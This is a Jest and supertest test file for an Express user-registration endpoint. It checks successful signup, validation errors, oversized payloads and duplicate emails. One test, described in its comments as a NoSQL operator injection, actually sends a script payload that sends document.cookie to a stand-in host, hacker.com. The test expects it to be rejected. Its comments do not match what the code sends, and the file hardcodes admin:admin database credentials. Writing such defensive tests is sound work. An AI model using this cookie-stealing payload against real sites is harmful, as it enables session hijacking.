import request from "supertest";
import app from "../../app.js"; // Import your Express App
import mongoose from "mongoose";
import { userModel } from "../../models/UserModel.js";

/* SETUP: CONNECT TO TEST DB 
   (If your app.js already connects to DB, you might not need the beforeAll part,
   but usually we separate them for testing)
*/
beforeAll(async () => {
    // Connect to a specific TEST database 
    await mongoose.connect("mongodb://admin:admin@localhost:27017/?replicaSet=myrepname");
});

/* CLEANUP: WIPE DATA BEFORE EACH TEST 
   This ensures Test A doesn't mess up Test B
*/
beforeEach(async () => {
    await userModel.deleteMany({});
});

/* TEARDOWN: CLOSE CONNECTION 
*/
afterAll(async () => {
    await mongoose.connection.close();
});

describe("POST /auth/register", () => {
    
    test("should register a user successfully (201)", async () => {
        const newUser = {
            name: "Billal",
            email: "billal@gmail.com",
            phone: "9876543210",
            password: "Billal@23",
            terms: true
        };

        
        // SUPERTEST ACTION
        // This simulates a real Postman request
        const response = await request(app)
            .post("/auth/register")
            .send(newUser);

            // ASSERTIONS
            expect(response.statusCode).toBe(201);
            expect(response.body.message).toBe("User registered successfully");

        // DOUBLE CHECK: Did it actually save to DB?
        const userInDb = await userModel.findOne({ email: "billal@gmail.com" });
        expect(userInDb).toBeTruthy();
        expect(userInDb.password).not.toBe("password123"); // Password should be hashed!
    });

    test("should block NoSQL injection attempt (Operator Injection)", async () => {
        const attackData = {
            name: "<script>fetch('http://hacker.com?cookie='+document.cookie)</script>",
            // THE ATTACK:
            // Instead of "email@gmail.com", we send a MongoDB Operator
            // { "$ne": null } means "Select anything that is not null"
            email: "email@gmail.com", 
            password: "Billal@123",
            phone: "<script>fetch('http://hacker.com?cookie='+document.cookie)</script>",
            terms: true
        };

        const response = await request(app)
            .post("/auth/register")
            .send(attackData);

        // EXPECTATION:
        // Your Zod middleware should stop this immediately with a 400.
        expect(response.statusCode).toBe(400);
        
        // OPTIONAL: Check specific Zod error
        // Zod usually returns: "Expected string, received object"
        // If your error format is flattened, it might just say "Invalid type"
        // console.log(response.body); // Uncomment to see exact message
    });

    test("should fail if Zod validation fails (Missing Name)", async () => {
        const badData = {
            email: "billal@gmail.com",
            // name : "billal",
            password: "Billal@23"
        };

        const response = await request(app)
            .post("/auth/register")
            .send(badData);

        console.log("DEBUG ZOD ERROR:", JSON.stringify(response.body, null, 2));

        // Assuming your Zod middleware returns 400 or 422
        expect(response.statusCode).toBe(400);
       expect(response.body.error).toContain("Required");
        // Optional: check error message
    });

    test("should reject extremely long payloads (DoS protection)", async () => {
    const longName = "a".repeat(100000); // 100k characters

    const response = await request(app)
        .post("/auth/register")
        .send({
            name: longName,
            email: "dos@gmail.com",
            password: "Password@123",
            phone: "0987654321",
            terms: true
        });

    // Expecting 413 (Payload Too Large) or 400 (Bad Request from Zod)
    expect([400, 413]).toContain(response.statusCode);
});

    test("should fail if user already exists", async () => {
        // 1. Create a user first
        await userModel.create({
            name: "Existing",
            email: "billal@gmail.com", // Same email
            phone: "7420864014",
            password: "Billal@23",
            terms: true
        });

        // 2. Try to register again with same email
        const newUser = {
            name: "Billal",
            email: "billal@gmail.com",
            phone: "9876543210",
            password: "Billal@23",
            terms: true
        };

        const response = await request(app)
            .post("/auth/register")
            .send(newUser);

        expect(response.statusCode).toBe(400); // Or whatever your service returns
        expect(response.body.error).toBe("User already exists");
    }); 
});